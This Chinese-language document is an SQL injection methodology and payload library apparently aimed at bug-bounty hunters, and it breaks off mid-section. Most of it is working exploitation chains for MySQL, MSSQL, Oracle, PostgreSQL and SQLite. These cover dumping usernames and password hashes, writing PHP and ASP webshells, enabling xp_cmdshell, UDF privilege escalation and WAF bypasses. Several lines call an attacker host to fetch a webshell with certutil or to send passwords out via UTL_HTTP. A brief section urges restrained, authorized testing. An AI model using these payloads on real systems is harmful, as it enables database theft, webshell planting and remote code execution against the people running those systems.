# SQL 注入

> 视角：黑盒，目标是从 0 到拿数据 / 拿权限

## 1. 一句话说清

SQLi = 把"数据"提升为"SQL 指令"。
SRC 价值：能拖库或读 admin hash 的 SQLi → P1，DBA 权限或 RCE 升级 → P0。
WooYun 27,732 案例中，**66% 在登录框、64% 在搜索、60% 在 POST 表单、26% 在 HTTP Header**。

---

## 2. 高频入口点（27,732 案例统计）

### 2.1 高频危险参数名（按频次）

```python
# 数字型 ID 类（最常见）
'id': 56,           'sort_id': 37,      'stid': 32,
'fid': 8,           'hotelid': 11,      'areainfoid': 8,

# 认证（高危）
'username': 33,     'password': 30,     'userpwd': 11,

# 业务
'type': 18,         'action': 7,        'page': 4,
'name': 30,

# ASP.NET 特有（.NET 应用必查）
'__viewstate': 58,  '__eventvalidation': 56,
'__eventargument': 52, '__eventtarget': 41,
```

### 2.2 注入向量分布

| 向量 | 占比 | 典型 |
|------|------|------|
| 登录框 | 66% | 用户名/密码字段拼接 |
| 搜索框 | 64% | LIKE 模糊匹配 |
| POST 参数 | 60% | 表单提交 |
| HTTP Header | 26% | User-Agent / Referer / X-Forwarded-For |
| GET 参数 | 24% | URL |
| Cookie | 12% | 会话标识 |

### 2.3 URL 模式

```
# 列表 / 详情
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# 搜索
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# 后台
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API
/api/getData.php?type=user&id=1
```

### 2.4 后端类型快表

| 后缀 | 数据库 | 报错关键字 |
|------|--------|----------|
| `.php` | MySQL | `You have an error in your SQL syntax` |
| `.aspx` | MSSQL / Oracle | `Unclosed quotation mark` / `Microsoft OLE DB` |
| `.asp` | Access / MSSQL | `Microsoft JET Database Engine` |
| `.jsp` / `.do` / `.action` | Oracle / MySQL | `ORA-00942` / SQL exception |
| 现代 API（JSON） | 任意 ORM | 看响应字段 / 后端框架 |

---

## 3. 探测手法

### 3.1 注入点确认

```sql
id=1'                 # 报错？
id=1"
id=1)
id=1;
id=1--
id=1#
id=1 AND 1=1          # 正常
id=1 AND 1=2          # 异常
id=1*1                # 数字型用算术
id=1-0
id=1 AND sleep(3)     # 时间盲探
```

观察：
- 响应内容差异（页面变化）
- 响应长度差异
- 响应时间差异（盲注）
- 错误信息（暴库类型）

### 3.2 数据库指纹

```sql
-- MySQL
SELECT version()                                    → 5.7.x / 8.x
SELECT @@version
SELECT user(), database()
AND sleep(5)
AND benchmark(10000000, sha1('a'))

-- MSSQL
SELECT @@version
SELECT db_name(), system_user
WAITFOR DELAY '0:0:5'

-- Oracle
SELECT banner FROM v$version WHERE rownum=1
SELECT user FROM dual
AND dbms_pipe.receive_message('a',5)=1

-- PostgreSQL
SELECT version()
SELECT current_database(), current_user
SELECT pg_sleep(5)

-- SQLite
SELECT sqlite_version()

-- Access
SELECT TOP 1 1 FROM MSysObjects     # 特有，无 #/-- 注释
```

### 3.3 各注入技术 payload 模板

#### 布尔盲

```
id=1 AND 1=1
id=1 AND 1=2

id=1' AND '1'='1
id=1' AND '1'='2

id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'

# RLIKE / REGEXP
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### 时间盲

```
# MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT(CASE WHEN(1=1) THEN SLEEP(5) ELSE 1 END))

# 双层延时（绕过单层 sleep 检测）
id=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'

# MSSQL
id=1; WAITFOR DELAY '0:0:5'--

# Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1

# PostgreSQL
id=1 AND pg_sleep(5)
```

#### 联合查询

```
# 探列数
id=1 ORDER BY 1--   ... ORDER BY N--（报错时 N-1 为列数）

# 联合
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

# 数据
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### 报错注入

```
# MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

# MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

# MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

# MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
```

#### 堆叠（MSSQL / PostgreSQL）

```
id=1; SELECT pg_sleep(5)--
id=1; EXEC xp_cmdshell 'whoami'--
```

### 3.4 完整利用链 Cheatsheet

#### MySQL

```sql
-- Step 1
union select 1,database(),version(),user(),5--

-- Step 2: 全部库
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: 当前库的表
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: 列名
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: 数据
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: 文件读（FILE 权限）
union select 1,load_file('/etc/passwd'),3--

-- Step 7: webshell（FILE + 写权限 + 路径已知）
union select 1,'<?php @system($_POST[c]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,name,3 from syscolumns where id=object_id('users')--

-- 命令执行（sa）
; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC master..xp_cmdshell 'whoami'--
```

#### Oracle

```sql
union select banner,null from v$version where rownum=1--
union select user,null from dual--
union select table_name,null from all_tables where rownum<=10--
```

### 3.5 工具

```bash
# sqlmap（最常用）
sqlmap -u "https://target/page.php?id=1" --batch
sqlmap -r request.txt --batch                # 用 Burp 保存的请求
sqlmap -u "..." --dbs                        # 列库
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T users --columns
sqlmap -u "..." -D dbname -T users -C "username,password" --dump --start 1 --stop 3   # 限制取 3 条
sqlmap -u "..." --tamper=between,space2comment,charencode    # 多 tamper 串联
sqlmap -u "..." --time-sec=10 --technique=T   # 仅时间盲
sqlmap -u "..." --os-shell                    # 仅在授权场景
```

---

## 4. Bypass 矩阵（详见 methodology/02-bypass-toolkit.md）

| 维度 | Payload |
|------|---------|
| 关键字 | `UnIoN SeLeCt` / `un/**/ion sel/**/ect` / `/*!50000union*//*!50000select*/` |
| 空格 | `/**/` / `%09` / `%0a` / 括号 / `+` |
| 引号 | `0x...` 十六进制 / `char()` / `%df%27`（GBK 宽字节） |
| 函数 | `mid()`/`substr()`/`substring()`/`left()` 互换；`if()`/`case when` |
| 等号 | `LIKE`/`REGEXP`/`IN(1)`/`BETWEEN` |
| 注释 | `--` / `#` / `/**/` / `;%00` |
| 二次注入 | 先存（含 `'`）再触发查询 |
| 入口换 | Header / Cookie / X-Forwarded-For 注入 |

### sqlmap tamper 速记

```
between, space2comment, charencode, bluecoat, modsecurityzeroversioned,
versionedmorekeywords, randomcase, percentage, equaltolike, apostrophemask,
space2hash, space2mssqlblank, space2plus
```

### 真实 WooYun 绕过 payload

```
# 内联注释（DeDeCMS 经典绕过）
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`

# 双层 sleep（wooyun-2015-0114228）
hotelid=(select(2)from(select(sleep(8)))v)
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))

# 报错链（wooyun-2015-0157074）
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

---

## 5. 利用提权 / 横向

```
SQLi
  → 拿 admin hash → 离线破解（rockyou.txt） → 登录后台
  → 拿全表数据
  → 拿 DB 版本 → 找已知 CVE
  → DBA 权限 → load_file / outfile → 任意文件读写 → Webshell → RCE
  → MSSQL xp_cmdshell → RCE
  → 堆叠注入 + xp_cmdshell（MSSQL）
  → Oracle UTL_HTTP.request → SSRF
```

参考案例：wooyun-2015-0157074 广州嘉航软件，DBA 权限 + root hash + 512 用户密码。

---

## 6. 真实案例指纹

| 类型 | wooyun ID | Payload 特征 |
|------|----------|------------|
| 报错 + 布尔 | wooyun-2015-0157074 | `txtuser=-7004' OR 6089=6089#` |
| 双层时间盲 | wooyun-2015-0114228 | `(select(2)from(select(sleep(8)))v)` |
| 内联注释 | wooyun-2015-0113920 | `/*!50000union*//*!50000select*/` |
| ASP.NET ViewState | 多 | 改 `__VIEWSTATE` 触发反序列化 |
| Header 注入 | 多 | `User-Agent: 1' AND ...` |

通用指纹：
- 错误信息含 `MySQL syntax error` / `near` / `unclosed quotation` / `ORA-00942` → 数据库类型确认
- 同参数 `?id=1 AND sleep(5)` 5s 延时 + `?id=1 AND sleep(0)` 0s = 100% 时间盲
- `?id=1` 与 `?id=2-1` 返回相同 = 数字型，可注入

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **基线**：`?id=1` 正常响应
2. **注入证明**：报错 / 布尔差异 / 时间差（≥5s 稳定）
3. **数据证据**：`version()`、`current_database()`、第一行 admin 用户名（脱敏）
4. **影响升级链**：能读 admin hash？能读其他库？能 outfile？

### 7.2 PoC 模板

```http
GET /api/search?keyword=test' AND (SELECT SLEEP(5))-- - HTTP/1.1
Host: target.com

→ 响应时间：5.234s

GET /api/search?keyword=test' AND (SELECT SLEEP(0))-- - HTTP/1.1
→ 响应时间：0.087s

# 5 次复现
1: 5.21s vs 0.09s
2: 5.18s vs 0.07s
3: 5.31s vs 0.08s
4: 5.22s vs 0.09s
5: 5.19s vs 0.08s

# 数据证明
GET /api/search?keyword=test' UNION SELECT 1,version(),3-- -

→ 响应：[{"id":1,"name":"5.7.34-log","desc":3}]
```

### 7.3 sqlmap log 附件

```
保留 sqlmap 的 -v 3 输出 log，证明工具识别为可注入。
日志含：
  [INFO] testing connection to the target URL
  [INFO] testing if the target URL content is stable
  [INFO] target URL content is stable
  ...
  [INFO] (parameter) is vulnerable. Do you want to keep testing the others (if any)? [y/N]
```

### 7.4 CVSS

```
未授权 SQLi（可拖库）   CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
认证 SQLi              CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
SQLi → RCE (DBA)       = 9.8
仅时间盲 / 不可拖     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
```

### 7.5 影响段

```
通过 /api/search 接口的 keyword 参数，攻击者可注入 SQL 指令，
基于时间的盲注稳定 5 秒延时差异（5/5 复现）。

通过 UNION SELECT 已确认：
1. 数据库版本 5.7.34-log（MySQL）
2. 当前库 prod_main
3. users 表存在 admin 用户（用户名前缀 ad****）

我未尝试拖出完整数据 / 读 admin 密码 hash / outfile 写文件。
```

---

## 8. 不要做的事

- **禁**：用 sqlmap 全量 dump 表（即使能）。`--start 1 --stop 3` 拿 3 条样本足够。
- **禁**：实际 outfile 写文件 / xp_cmdshell 执行命令。"证明能"即可。
- **禁**：报告中粘贴他人完整 PII。脱敏到只剩前 2 + 后 2 字符。
- **禁**：用读到的 admin hash 离线破解后实际登录目标后台。
- **禁**：堆叠 DROP / DELETE / UPDATE 语句。仅 SELECT。
- **限**：sqlmap 默认线程偏激进，`--threads=1 --delay=1`。
- **报告中**：admin 密码 hash 写前 8 字符 + sha256 of full hash。

## H1 真实案例

_共 147 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | — | Starbucks | [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051) | SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database |
| Critical | — | GSA Bounty | [SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent](https://hackerone.com/reports/297478) | I've identified an SQL injection vulnerability in the website **labs.data.gov** that affects the endpoint `/dashboard/datagov/c… |
| Critical | 25000 usd | Valve | [SQL Injection in report_xml.php through countryFilter[] parameter](https://hackerone.com/reports/383127) | SQL Injection in report_xml.php through countryFilter[] parameter |
| Critical | 4500 usd | Eternal | [[www.zomato.com] SQLi - /php/██████████ - item_id](https://hackerone.com/reports/403616) | [www.zomato.com] SQLi - /php/██████████ - item_id |
| High | — | MTN Group | [SQL Injection on cookie parameter](https://hackerone.com/reports/761304) | Summary: Hello team. It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang … |
| High | 4500 usd | Grab | [www.drivegrab.com SQL injection](https://hackerone.com/reports/273946) | Summary:** The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code. Description:… |
| Critical | 4134 usd | inDrive | [Blind SQL injection on id.indrive.com](https://hackerone.com/reports/2051931) | Summary: The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a q… |
| High | — | Acronis | [SQL Injection in agent-manager](https://hackerone.com/reports/962889) | 1.https://mc-beta-cloud.acronis.com/api/agent_manager/v2/unit_configurations?name=update-schedule&no_data=false&tenant_id=15902… |
| Critical | — | Starbucks | [Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice](https://hackerone.com/reports/592400) | Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice |
| High | — | Starbucks | [Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*](https://hackerone.com/reports/549355) | Blind SQL Injection on starbucks.com.gt and WAF Bypass :* |
| Critical | — | HackerOne | [SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter](https://hackerone.com/reports/435066) | The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection |
| High | — | Automattic | [Sql injection on docs.atavist.com](https://hackerone.com/reports/1039315) | hello dear team I have found SQL injection on docs.atavist.com url:http://docs.atavist.com/reader_api/stories.php?limit=10&offs… |

**命中本类的 weakness 分布：**

- SQL Injection：140 条
- Uncategorized → 手工归类：2 条
- XML Injection：2 条
- LDAP Injection：2 条
- Blind SQL Injection：1 条


## Payload 库

_17 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

### MySQL注入 - 基础探测  `sqli-mysql-basic`
MySQL数据库注入基础探测与数据提取技术
子类：**MySQL** · tags: `sqli` `mysql` `injection` `database`

**前置条件：** 目标存在SQL注入点；后端数据库为MySQL；了解基本SQL语法

**攻击链：**

**1. 1. 探测注入点**
_使用单引号和布尔条件探测是否存在注入点_
```
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```

**2. 2. 确定列数**
_使用ORDER BY或UNION SELECT NULL确定查询列数_
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错确定列数
或使用:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**3. 3. 确定显示位置**
_找出哪些列会显示在页面上_
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

**4. 4. 获取数据库信息**
_获取当前数据库名、用户、版本等基础信息_
```
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```

**5. 5. 枚举所有数据库**
_获取MySQL服务器上所有数据库名_
```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```

**6. 6. 枚举表名**
_获取指定数据库中的所有表名_
```
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```

**7. 7. 枚举列名**
_获取指定表的所有列名_
```
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```

**8. 8. 提取数据**
_从目标表中提取敏感数据_
```
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```

**WAF/EDR 绕过变体：**

**1. 大小写混淆**
_使用大小写混合绕过关键字过滤_
```
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

**2. 内联注释**
_使用MySQL特有内联注释绕过_
```
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

**3. 双写绕过**
_双写关键字绕过替换过滤_
```
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

**4. 空格替代**
_使用注释、换行、括号替代空格_
```
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```

**5. 编码绕过**
_使用编码函数绕过关键字检测_
```
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```

---

### MySQL注入 - 高级技术  `sqli-mysql-advanced`
MySQL高级注入技术：文件读写、UDF提权、命令执行
子类：**MySQL** · tags: `sqli` `mysql` `advanced` `file-read` `rce`

**前置条件：** MySQL用户具有FILE权限；知道网站绝对路径；secure_file_priv配置允许

**攻击链：**

**1. 1. 检测FILE权限**
_检测当前用户是否有FILE权限_
```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```

**2. 2. 获取网站路径**
_通过错误信息或读取文件获取网站路径_
```
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

**3. 3. 读取敏感文件**
_使用load_file读取系统敏感文件_
```
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```

**4. 4. 写入WebShell**  _[linux]_
_使用INTO OUTFILE写入WebShell_
```
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```

**5. 5. 日志写Shell**  _[linux]_
_通过开启general_log写入Shell_
```
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```

**6. 6. UDF提权**  _[linux]_
_使用UDF提权执行系统命令_
```
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

**WAF/EDR 绕过变体：**

**1. Hex编码写入**  _[linux]_
_使用十六进制编码绕过关键字检测_
```
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```

**2. Char编码绕过**  _[linux]_
_使用CHAR函数编码绕过_
```
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```

---

### MSSQL注入 - 基础探测  `sqli-mssql-basic`
Microsoft SQL Server数据库注入技术
子类：**MSSQL** · tags: `sqli` `mssql` `sqlserver` `injection`

**前置条件：** 目标存在SQL注入点；后端使用MSSQL数据库

**攻击链：**

**1. 1. 探测注入点**
_基础注入探测_
```
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```

**2. 2. 获取版本信息**
_获取MSSQL版本信息_
```
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```

**3. 3. 获取用户信息**
_获取当前用户及权限信息_
```
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```

**4. 4. 获取数据库信息**
_获取所有数据库名_
```
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```

**5. 5. 获取表名**
_获取用户表名_
```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

**6. 6. 获取列名**
_获取指定表的列名_
```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

**7. 7. 提取数据**
_提取表中的数据_
```
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```

**WAF/EDR 绕过变体：**

**1. Hex编码**
_使用Hex编码绕过_
```
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```

**2. 注释绕过**
_使用注释和空字节绕过_
```
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```

---

### MSSQL注入 - 高级技术  `sqli-mssql-advanced`
MSSQL高级注入：xp_cmdshell、SP_OACREATE命令执行
子类：**MSSQL** · tags: `sqli` `mssql` `xp_cmdshell` `rce`

**前置条件：** MSSQL具有高权限；xp_cmdshell可用或可开启

**攻击链：**

**1. 1. 检测xp_cmdshell状态**  _[windows]_
_检测xp_cmdshell是否可用_
```
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```

**2. 2. 开启xp_cmdshell**  _[windows]_
_如果xp_cmdshell被禁用，尝试开启_
```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

**3. 3. 执行系统命令**  _[windows]_
_使用xp_cmdshell执行系统命令_
```
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
```

**4. 4. 写入WebShell**  _[windows]_
_写入或下载WebShell_
```
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```

**5. 5. SP_OACREATE方法**  _[windows]_
_使用SP_OACREATE执行命令_
```
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```

**WAF/EDR 绕过变体：**

**1. 堆叠查询**  _[windows]_
_使用动态SQL绕过_
```
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```

---

### Oracle注入 - 基础探测  `sqli-oracle-basic`
Oracle数据库注入基础技术
子类：**Oracle** · tags: `sqli` `oracle` `injection`

**前置条件：** 目标存在SQL注入点；后端使用Oracle数据库

**攻击链：**

**1. 1. 探测注入点**
_探测注入点类型_
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

**2. 2. 获取版本信息**
_获取Oracle版本_
```
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```

**3. 3. 获取用户信息**
_获取数据库用户_
```
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```

**4. 4. 获取表名**
_获取表名_
```
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```

**5. 5. 获取列名**
_获取列名和数据类型_
```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**6. 6. 提取数据**
_提取表数据_
```
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```

**WAF/EDR 绕过变体：**

**1. UTL_HTTP外带**
_使用UTL_HTTP外带数据_
```
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```

---

### Oracle注入 - 高级技术  `sqli-oracle-advanced`
Oracle高级注入技术：Java存储过程、UTL_FILE文件操作
子类：**Oracle** · tags: `sqli` `oracle` `advanced` `rce`

**前置条件：** Oracle高权限；Java虚拟机可用

**攻击链：**

**1. 1. 检测Java权限**
_检测Java存储过程是否可用_
```
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```

**2. 2. 创建Java执行函数**
_使用Java执行系统命令_
```
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```

**3. 3. UTL_FILE读取文件**
_使用UTL_FILE操作文件_
```
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```

**WAF/EDR 绕过变体：**

**1. Oracle特有函数绕过**
_使用Oracle XMLType、DBMS_PIPE、CASE表达式等特有函数绕过WAF关键字检测_
```
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```

**2. Oracle注释与编码绕过**
_使用注释符替代空格、CHR()编码字符串、RAWTOHEX/UTL_ENCODE进行数据编码绕过_
```
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```

---

### PostgreSQL注入 - 基础探测  `sqli-postgres-basic`
PostgreSQL数据库注入技术
子类：**PostgreSQL** · tags: `sqli` `postgresql` `postgres` `injection`

**前置条件：** 目标存在SQL注入点；后端使用PostgreSQL

**攻击链：**

**1. 1. 探测注入点**
_探测注入点_
```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. 获取版本信息**
_获取数据库信息_
```
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```

**3. 3. 获取表名**
_获取public模式下的表_
```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

**4. 4. 获取列名**
_获取列名_
```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**5. 5. 读取文件**  _[linux]_
_使用pg_read_file读取文件_
```
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```

**6. 6. 写入文件**  _[linux]_
_使用COPY写入文件_
```
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_使用chr函数编码_
```
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```

---

### SQLite注入  `sqli-sqlite-basic`
SQLite数据库注入攻击
子类：**SQLite** · tags: `sqli` `sqlite`

**前置条件：** SQLite数据库；存在注入点

**攻击链：**

**1. 1. 探测注入点**
_探测注入点_
```
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

**2. 2. 获取版本**
_获取SQLite版本_
```
' UNION SELECT sqlite_version(),NULL--
```

**3. 3. 获取表名**
_获取所有表名_
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

**4. 4. 获取表结构**
_获取建表语句_
```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
```

**5. 5. 读取文件**
_读取文件(需要扩展)_
```
